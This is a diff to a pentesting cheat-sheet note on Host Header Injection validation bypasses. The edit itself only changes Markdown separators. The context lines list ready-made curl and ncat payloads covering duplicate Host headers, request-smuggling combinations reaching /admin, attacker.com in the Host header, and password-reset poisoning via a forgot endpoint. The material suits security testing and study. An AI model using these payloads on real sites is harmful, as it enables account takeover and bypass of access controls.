@@ -16,7 +16,7 @@ linked:
 ---
 # Host Header Injection - Bypass de Validación
 
-***
+---
 
 ## Multiple Host Headers
 
@@ -30,7 +30,7 @@ linked:
 | `printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: attacker.com\r\n\r\n' \| ncat target 80` | HRS combo smuggling Host | HRS + HHI. |
 ^hhi-bypass-multiple
 
-___
+---
 
 ## Port Injection
 
@@ -45,7 +45,7 @@ ___
 | `curl -H "Host: https://attacker.com:1337" https://target/` | Absolute URL en Host | Some parsers accept. |
 ^hhi-bypass-port
 
-___
+---
 
 ## Indentation / Whitespace
 
@@ -60,7 +60,7 @@ ___
 | `printf 'GET / HTTP/1.1\r\nHost: target.com\r\n\r\nGET /admin HTTP/1.1\r\n\r\n' \| ncat target 80` | Double CRLF truncate (HRS adjacent) | Smuggling combo. |
 ^hhi-bypass-whitespace
 
-___
+---
 
 ## Absolute URL en Request Line
 
@@ -73,7 +73,7 @@ ___
 | `printf 'GET https://target.com//admin HTTP/1.1\r\nHost: target.com\r\n\r\n' \| ncat target 80` | Multiple slashes — path normalization differential | Path traversal-adjacent. |
 ^hhi-bypass-absolute
 
-___
+---
 
 ## Path Injection en Host
 
@@ -88,4 +88,4 @@ ___
 | `curl -X POST -H "Host: target.com#@attacker.com" -d "email=victim" https://target/forgot` | Combo HHI + Open Redirect via reflected base href | XSS-adjacent via reflection. |
 ^hhi-bypass-path
 
-***
+---
